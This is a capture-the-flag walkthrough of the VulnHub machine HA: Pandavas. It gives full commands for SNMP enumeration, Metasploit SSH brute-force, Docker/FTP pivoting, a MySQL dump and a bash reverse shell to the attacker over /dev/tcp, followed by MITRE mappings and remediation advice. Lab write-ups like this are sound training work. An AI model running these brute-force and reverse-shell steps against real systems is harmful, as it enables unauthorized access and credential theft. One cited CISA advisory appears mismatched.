# HA: Pandavas — Five Heroes, Five Flags, One Machine to Rule Them All

The Pandavas were five brothers from the Mahabharata, each a master of a different skill: archery, strength, wisdom, speed, and devotion. HA: Pandavas mirrors this perfectly with five flags, each requiring a different enumeration technique. A hidden Word document, SNMP enumeration, custom CeWL wordlist brute-force, Docker container pivoting, and unrestricted sudo escalation — each flag is a different discipline. Master all five, and you rule the machine. Goated CTF design. Legit.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Pandavas |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-pandavas,487/ |
| **Techniques** | Nmap TCP+UDP scanning, dirb directory brute-force, SNMP enumeration with snmpwalk, CeWL custom wordlist generation, Metasploit SSH brute-force, Docker container enumeration, FTP access inside container, MySQL dump, sudo ALL privilege escalation |
| **CVEs** | CWE-200 (Information Exposure: SNMP community string leaks credentials and flags), CWE-798 (Hard-coded Credentials: Docker container MySQL default password), CWE-269 (Improper Privilege Management: unrestricted sudo for regular user) |
| **APT Groups** | APT41: exploits SNMP exposure to enumerate internal network information in pre-ransomware reconnaissance phases; FIN7: harvests credentials from exposed network services and container environments for lateral movement |

---

## Attack Summary

```
nmap TCP → SSH (22), HTTP (80)
nmap UDP → SNMP (161)
  → dirb → hidden.docx → Flag 1
  → cewl http://target → pandavas_wordlist.txt
  → snmpwalk -v1 -c public → Flag 2 + username: karna
  → msf ssh_login (karna) + CeWL wordlist → karna password
  → ssh karna → enumerate /etc/passwd → krishna
  → msf ssh_login (krishna) + CeWL wordlist → krishna password
  → ssh krishna → sudo -l → sudo ALL (unrestricted)
  → ip addr → Docker networking visible
  → ftp 172.17.0.2 (anon) → .ash_history → Flag 3 + base64 creds
  → base64 decode → MySQL password
  → mysqldump -A -u root → grep flag → Flag 4
  → nc -nvlp 4444 (attacker)
  → sudo -u root bash -i >& /dev/tcp/attacker/4444 0>&1 → root shell
  → cat /root/flag.txt → Flag 5
```

---

## Methodology

1. Host discovery and TCP + UDP port scan
2. Web enumeration: dirb to find hidden.docx
3. Custom wordlist generation with CeWL from web content
4. SNMP enumeration to extract Flag 2 and username karna
5. SSH brute-force with Metasploit using CeWL wordlist
6. Lateral movement to user krishna via same technique
7. Docker container enumeration via internal network interfaces
8. FTP access inside Docker container for Flag 3 and encoded credentials
9. MySQL dump inside Docker for Flag 4
10. Root shell via unrestricted sudo and netcat reverse shell

---

## Step 1 — Host Discovery and Port Scan

```bash
netdiscover -r 192.168.10.0/24
# Target: 192.168.10.162

nmap -sV -p- 192.168.10.162
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Also run a UDP scan to catch SNMP:

```bash
nmap -sU -p 161 192.168.10.162
# 161/udp open  snmp
```

Three services: SSH, HTTP, SNMP. SNMP is the goldmine here.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and Flag 1

```bash
dirb http://192.168.10.162/ /usr/share/wordlists/dirb/big.txt -X .php,.docx,.txt
```

The scan discovers `hidden.docx` in the web root.

```bash
wget http://192.168.10.162/hidden.docx
# Open with LibreOffice or strings:
strings hidden.docx | grep -i flag
```

**Flag 1** is embedded inside the document text.

Generate a custom CeWL wordlist from the themed page content (Mahabharata references will be exactly what passwords are based on):

```bash
cewl http://192.168.10.162/ -m 4 -w /tmp/pandavas_wordlist.txt
wc -l /tmp/pandavas_wordlist.txt
```

**Real-world note:** CeWL-generated wordlists are far more effective than generic rockyou when the target organization uses themed or industry-specific terminology for passwords. This is a standard technique in professional penetration testing engagements.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1598 — Phishing for Information (passive wordlist gathering)

---

## Step 3 — SNMP Enumeration and Flag 2

Query the SNMP service with the default community string:

```bash
snmpwalk -v1 -c public 192.168.10.162 | more
```

The SNMP walk reveals:
- **Flag 2** embedded directly in the MIB tree output
- Username: `karna` (one of the Pandavas' rivals in the epic)

```bash
snmpwalk -v1 -c public 192.168.10.162 | grep -i "flag\|user\|pass\|karna"
```

**Real-world note:** SNMP v1 and v2c with the default community string `public` is still found in production environments at shocking frequency. Network devices, printers, UPS systems, and legacy servers routinely respond to SNMP public queries, leaking system information, network topology, running processes, and installed software. APT41 has documented SNMP enumeration as part of initial reconnaissance in multiple campaigns.

**MITRE ATT&CK:** T1602 — Data from Configuration Repository: SNMP MIB Dump; T1046 — Network Service Discovery

---

## Step 4 — SSH Brute-Force with Custom Wordlist

Use Metasploit's SSH login module with the CeWL wordlist against user karna:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.10.162
set USERNAME karna
set PASS_FILE /tmp/pandavas_wordlist.txt
set VERBOSE false
set THREADS 4
run
```

Metasploit finds the password. Log in:

```bash
ssh karna@192.168.10.162
```

Inspect `/etc/passwd` and `/home` to identify other users:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
ls /home
# Users: karna, krishna
```

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1078 — Valid Accounts

---

## Step 5 — Lateral Movement to `krishna`

Run the same brute-force against krishna:

```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME krishna
set PASS_FILE /tmp/pandavas_wordlist.txt
run
```

SSH in as krishna and check sudo rights:

```bash
ssh krishna@192.168.10.162
sudo -l
# (ALL) NOPASSWD: ALL
```

krishna has unrestricted sudo. This is the privilege escalation vector, but first, collect the remaining flags from Docker containers.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1078 — Valid Accounts

---

## Step 6 — Docker Container Enumeration

Check network interfaces and running processes to discover Docker:

```bash
ip addr
# Docker networking visible: docker0 bridge, container IPs on 172.17.x.x
ps aux | grep -i docker
```

Identify container IPs:

```bash
# Common Docker bridge range: 172.17.0.0/24
# Ping sweep:
for i in $(seq 1 10); do ping -c 1 172.17.0.$i 2>/dev/null | grep "bytes from"; done
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1046 — Network Service Discovery

---

## Step 7 — FTP Access Inside Docker and Flag 3

Connect to the FTP service running in the Docker container:

```bash
ftp 172.17.0.2
# Try anonymous login
# Username: anonymous / Password: (press Enter)
```

Navigate to the root directory and list hidden files:

```bash
ftp> ls -la
ftp> cd root
ftp> ls -la
ftp> get .ash_history
ftp> quit
```

Read the history file:

```bash
cat .ash_history
```

**Flag 3** appears in the history. The file also contains a Base64-encoded MySQL password:

```bash
# Look for base64 strings in the history
echo '<base64_string_from_history>' | base64 -d
# MySQL password revealed
```

**Real-world note:** Shell history files in FTP-accessible directories are a goldmine. Docker containers are frequently built with root-owned home directories that include history files containing commands with embedded credentials. This is documented in multiple container security assessments.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1021.003 — Remote Services: FTP

---

## Step 8 — MySQL Inside Docker and Flag 4

Use the decoded credential to dump all MySQL databases and search for flags:

```bash
mysqldump -A -u root --password=ignite@123 -h 172.17.0.2 | grep -i flag
# Or connect interactively:
mysql -u root -pignite@123 -h 172.17.0.2
show databases;
use mahadev;
show tables;
select * from hint;
```

**Flag 4** is embedded in one of the database tables.

**MITRE ATT&CK:** T1005 — Data from Local System; T1190 — Exploit Public-Facing Application

---

## Step 9 — Privilege Escalation: Root Shell via Unrestricted Sudo

As krishna (unrestricted sudo), establish a root reverse shell:

Set up listener on attacker:

```bash
nc -nvlp 4444
```

On the target as krishna:

```bash
sudo -u root bash -i >& /dev/tcp/192.168.10.161/4444 0>&1
```

Root shell connects. Collect Flag 5:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
ls /root
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. All five flags. The Pandavas are avenged.

**Real-world note:** `sudo ALL` for a regular user is the single worst sudo misconfiguration possible. It grants complete root access with no restrictions. This is found in real environments when administrators grant sudo rights without understanding the implications.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1059.004 — Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Flag 1 | Embedded in hidden.docx | Web root via dirb | Captured |
| Flag 2 | In SNMP MIB tree | snmpwalk output | Captured |
| Username | karna | SNMP MIB tree | SSH brute-force target |
| karna password | CeWL wordlist hit | Metasploit ssh_login | SSH login |
| krishna password | CeWL wordlist hit | Metasploit ssh_login | SSH login + pivot |
| Flag 3 | In .ash_history | FTP Docker container /root | Captured |
| MySQL password | ignite@123 | Base64 in .ash_history | MySQL dump |
| Flag 4 | MySQL table | mysqldump inside Docker | Captured |
| Flag 5 | /root/flag.txt | Unrestricted sudo root shell | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SNMP public community string leaks credentials and flags | SNMP v1/v2c with public community is still found at high frequency in production | Change community strings; use SNMPv3 with authentication; restrict SNMP to management IPs |
| 2 | CeWL wordlists are highly effective against themed targets | Standard wordlists fail when passwords are organization or context specific | Always generate custom wordlists from target content before running generic brute-force |
| 3 | Docker containers on internal interfaces run services with weak credentials | Container services are often overlooked during network enumeration | Include Docker bridge networks in scope; enumerate container services separately |
| 4 | Shell history files contain credentials in plaintext | History files persist credentials from interactive commands forever | Clear history after privileged operations; use tools that don't record credentials |
| 5 | `sudo ALL` grants immediate root | The principle of least privilege is violated when sudo allows all commands | Never grant sudo ALL; audit sudoers per host; require passwords for sensitive operations |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Collection | Collection | Data from Configuration Repository: SNMP | T1602 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Lateral Movement | Lateral Movement | Remote Services: FTP | T1021.003 |
| Collection | Collection | Data from Local System | T1005 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Change SNMP community string**: replace `public` with a strong non-guessable string; upgrade to SNMPv3 with authentication and encryption; restrict to management IPs via ACLs
2. **Remove hidden.docx from web root**: never store sensitive documents in publicly accessible web directories
3. **Enforce strong SSH password policy**: disable password authentication; use key-based auth only
4. **Restrict sudo**: never grant `sudo ALL`; define specific commands per user; require password for all sudo
5. **Secure Docker container services**: no anonymous FTP in containers; use strong unique passwords; remove sensitive files from container home directories
6. **Audit shell history**: implement command auditing that does not rely on history files for credentials

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (SNMP community string; FTP anonymous access)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions; credential management)
- **D3-HBPI** — Harden Build Pipeline Integrity (container build process; no credentials in history)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory Docker containers and their exposed services; SNMP device census |
| Protect | Access Control | Disable anonymous FTP; change SNMP community string; restrict sudo |
| Protect | Data Security | Remove documents from web root; purge credentials from shell history |
| Detect | Anomalies and Events | Alert on SNMP enumeration; detect brute-force on SSH |
| Respond | Response Planning | Rotate all exposed credentials; patch weak container configurations |
| Recover | Recovery Planning | Rebuild containers with secure baseline; audit all sudo grants |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict FTP anonymous access; SNMP access controls |
| AC-6 | Least Privilege | Remove sudo ALL; restrict to specific commands |
| IA-5 | Authenticator Management | Rotate MySQL, SSH, and SNMP credentials |
| CM-7 | Least Functionality | Disable SNMP if not needed; disable anonymous FTP |
| SI-12 | Information Management | Remove sensitive files from web-accessible directories |
| SC-28 | Protection of Information at Rest | No credentials in shell history files or FTP-accessible locations |

### CISA KEV

SNMP exploitation for credential and data leakage is referenced in multiple CISA advisories including AA22-011A (Apache Log4j vulnerabilities) and broader guidance on network device enumeration. Organizations should implement SNMPv3 per CISA network security baselines.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

HA: Pandavas is one of the best multi-flag boot2root designs on VulnHub. Each flag genuinely requires a different skill: reading documents, SNMP walking, wordlist crafting, container pivoting. You cannot shortcut it. There is no single "find the LFI and chain everything" path.

Just like the five Pandava brothers each had a unique gift that contributed to the whole, each flag here teaches something standalone valuable. The SNMP flag alone is worth the price of admission — it's a technique most beginners skip entirely, and finding it sitting right there in the MIB tree is a perfect lesson in "enumerate everything."

Thanks guys!! (❍ᴥ❍ʋ)
